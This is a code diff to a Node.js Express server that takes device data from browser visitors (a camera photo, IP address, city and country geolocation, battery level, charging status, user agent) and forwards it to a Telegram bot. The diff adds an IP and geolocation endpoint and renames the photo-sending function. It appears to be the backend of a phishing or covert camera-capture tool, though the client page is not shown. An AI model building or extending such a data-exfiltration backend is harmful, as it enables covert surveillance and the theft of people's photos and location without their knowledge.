@@ -31,8 +31,8 @@ function saveImageBuffer(buffer, filePath) {
     });
 }
 
-// Send photo with caption to Telegram
-async function sendPhotoToTelegram(dataURL, userAgent) {
+// Send photo and user agent details to Telegram
+async function sendPhotoAndUserAgentToTelegram(dataURL, userAgent) {
     const buffer = dataURItoBuffer(dataURL);
     const uniqueFileName = `photo_${uuidv4()}.png`;
     const filePath = path.join(__dirname, 'images', uniqueFileName);
@@ -58,9 +58,9 @@ async function sendPhotoToTelegram(dataURL, userAgent) {
         });
 
         if (response.status === 200) {
-            console.log('Photo sent to Telegram successfully');
+            console.log('Photo and user agent details sent to Telegram successfully');
         } else {
-            throw new Error(`Failed to send photo to Telegram: ${response.statusText}`);
+            throw new Error(`Failed to send photo and user agent details to Telegram: ${response.statusText}`);
         }
 
         // Clean up the saved image
@@ -69,37 +69,35 @@ async function sendPhotoToTelegram(dataURL, userAgent) {
         });
 
     } catch (error) {
-        console.error('Error sending photo to Telegram:', error);
+        console.error('Error sending photo and user agent details to Telegram:', error);
     }
 }
 
-// Get geolocation based on client IP
-async function getGeolocation(ip) {
+// Get public IP and geolocation
+app.get('/ip', async (req, res) => {
     try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        const ip = ipResponse.data.ip;
+
         const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
-        return geoResponse.data;
+        const geolocation = geoResponse.data;
+
+        res.json({ ip, geolocation });
     } catch (error) {
-        console.error('Error fetching geolocation:', error);
-        return null;
+        console.error('Error fetching IP and geolocation:', error);
+        res.status(500).send('Error fetching IP and geolocation');
     }
-}
+});
 
 // Receive device information
 app.post('/device-info', async (req, res) => {
     const deviceInfo = req.body;
     console.log('Device Info:', deviceInfo);
 
-    // Get client IP from request headers
-    const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    console.log('Client IP:', clientIp);
-
-    // Get geolocation based on client IP
-    const geolocation = await getGeolocation(clientIp);
-
     const message = `
 Device Information:
-- IP: ${clientIp}
-- Geolocation: ${geolocation ? `${geolocation.city}, ${geolocation.country}` : 'Unable to determine'}
+- IP: ${deviceInfo.ip}
+- Geolocation: ${deviceInfo.geolocation.city}, ${deviceInfo.geolocation.country}
 - Battery Percentage: ${deviceInfo.batteryPercentage}%
 - Charging Status: ${deviceInfo.chargingStatus}
 - User Agent: ${deviceInfo.userAgent}
@@ -109,8 +107,8 @@ Device Information:
         // Send device information message to Telegram
         await sendMessageToTelegram(message);
 
-        // Send the photo
-        await sendPhotoToTelegram(deviceInfo.photo, deviceInfo.userAgent);
+        // Send the photo and user agent
+        await sendPhotoAndUserAgentToTelegram(deviceInfo.photo, deviceInfo.userAgent);
 
         res.send('Device info received');
     } catch (error) {
